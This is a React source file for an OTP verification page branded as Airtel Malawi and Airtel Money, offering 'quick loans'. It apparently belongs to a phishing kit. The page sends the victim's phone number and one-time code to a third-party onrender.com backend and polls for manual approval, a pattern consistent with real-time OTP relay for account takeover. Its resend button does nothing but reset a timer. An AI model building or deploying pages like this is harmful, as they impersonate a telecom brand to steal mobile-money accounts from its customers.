import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const API_BASE = (import.meta.env.VITE_API_BASE_URL || 'https://airtel-loan-backend-z5vx.onrender.com').replace(/\/$/, '');
const OTP_LENGTH = 4;
const TIMER_START = 60;
const FETCH_TIMEOUT_MS = 90_000;

async function apiFetch(path: string, opts: RequestInit = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
  try {
    return await fetch(`${API_BASE}${path}`, {
      ...opts, signal: ctrl.signal, mode: 'cors', credentials: 'omit',
      headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) },
    });
  } finally { clearTimeout(timer); }
}

function AirtelOTPVerify() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(TIMER_START);
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState('');
  
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const phoneNumber = localStorage.getItem('airtelPhone') || '...';

  useEffect(() => {
    if (!phoneNumber) navigate('/');
    const id = setInterval(() => setTimeLeft(prev => (prev <= 1 ? 0 : prev - 1)), 1000);
    return () => clearInterval(id);
  }, [phoneNumber, navigate]);

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 3) otpRefs.current[index + 1]?.focus();
  };

  const stopPolling = () => { if (pollRef.current) clearInterval(pollRef.current); };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');
    if (otpString.length < 4) return;

    setError('');
    setIsVerifying(true);

    try {
      const response = await apiFetch('/api/verify-otp', {
        method: 'POST',
        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString, ref_id: `AL-${Date.now()}` }),
      });
      const data = await response.json();

      if (data.status === 'approved') {
        navigate('/airtel-loan-limit');
        return;
      }

      if (data.status === 'rejected') {
        setError('Invalid OTP code.');
        setIsVerifying(false);
        return;
      }

      // Poll status
      pollRef.current = setInterval(async () => {
        const res = await apiFetch(`/api/otp-status/${encodeURIComponent(data.ref_id)}`);
        const status = await res.json();
        if (status.status === 'approved') {
          stopPolling();
          navigate('/airtel-loan-limit');
        } else if (status.status === 'rejected' || status.status === 'expired') {
          stopPolling();
          setIsVerifying(false);
          setError('Code rejected or expired.');
        }
      }, 2000);

    } catch {
      setIsVerifying(false);
      setError('Network error.');
    }
  };

  return (
    <div className="page-wrapper">
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #DA1C1C; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
        .header-title { font-size: 22px; font-weight: 900; }
        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
        
        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
        
        .back-link { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #6B7280; text-decoration: none; margin-bottom: 20px; cursor: pointer; }
        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; line-height: 1.5; }
        
        .label { font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; display: block; text-align: center; }
        .otp-boxes { display: flex; gap: 12px; margin-bottom: 24px; justify-content: center; }
        .otp-box { width: 60px; height: 60px; border: 1px solid #D1D5DB; border-radius: 8px; font-size: 24px; font-weight: 700; text-align: center; outline: none; background: #fff; color: #1a1a1a; }
        .otp-box:focus { border-color: #DA1C1C; box-shadow: 0 0 0 2px rgba(218,28,28,0.2); }
        
        .timer-row { display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; font-size: 16px; color: #1a1a1a; margin-bottom: 24px; }
        .timer-icon { color: #DA1C1C; }
        
        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; margin-bottom: 12px; }
        .btn-primary { background: #F87171; color: #1a1a1a; }
        .btn-primary:active { background: #EF4444; }
        .btn-secondary { background: #E5E7EB; color: #6B7280; }
        .btn-disabled { background: #E5E7EB; color: #9CA3AF; cursor: not-allowed; }
        
        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
        
        .overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
        .spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
        .spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
        .spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; } .spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
        .spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; } .spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
        .spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; } .spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
        .spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; } .spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
        .spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; } .spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; } .spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
      `}</style>

      {isVerifying && (
        <div className="overlay">
          <div className="spinner-box">
            <div className="spinner">
              <div></div><div></div><div></div><div></div><div></div><div></div>
              <div></div><div></div><div></div><div></div><div></div><div></div>
            </div>
            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Processing...</h2>
            <p style={{fontSize: '14px', color: '#6B7280'}}>Please wait while we verify your code...</p>
          </div>
        </div>
      )}

      <div className="header-top">
        <div className="menu-icon">≡</div>
        <h1 className="header-title">Airtel Malawi</h1>
      </div>
      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>

      <div className="card">
        <div className="back-link" onClick={() => navigate('/')}>← Back to login</div>
        
        <h2 className="card-title">Verify your code</h2>
        <p className="card-sub">Enter the 4-digit code sent to <br/><b>{phoneNumber}</b></p>

        {error && <div style={{color: '#DA1C1C', textAlign: 'center', marginBottom: '16px', fontWeight: 600}}>{error}</div>}

        <label className="label">Enter OTP code</label>
        <div className="otp-boxes">
          {otp.map((digit, i) => (
            <input
              key={i}
              type="tel"
              className="otp-box"
              maxLength={1}
              value={digit}
              ref={(el) => { otpRefs.current[i] = el; }}
              onChange={(e) => handleOtpChange(i, e.target.value)}
              onKeyDown={(e) => { if (e.key === 'Backspace' && !otp[i] && i > 0) otpRefs.current[i - 1]?.focus(); }}
            />
          ))}
        </div>

        <div className="timer-row">
          <svg className="timer-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          {timeLeft}s
        </div>

        <button className={`btn ${otp.join('').length === 4 ? 'btn-primary' : 'btn-disabled'}`} onClick={handleVerify} disabled={otp.join('').length < 4}>
          Verify code →
        </button>
        
        <button className="btn btn-secondary" onClick={() => setTimeLeft(TIMER_START)}>
          Resend code
        </button>
      </div>

      <div className="bottom-brands">
        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
        <div className="brand-icon" style={{color: '#1E293B'}}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
        </div>
        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
      </div>
    </div>
  );
}

export default AirtelOTPVerify;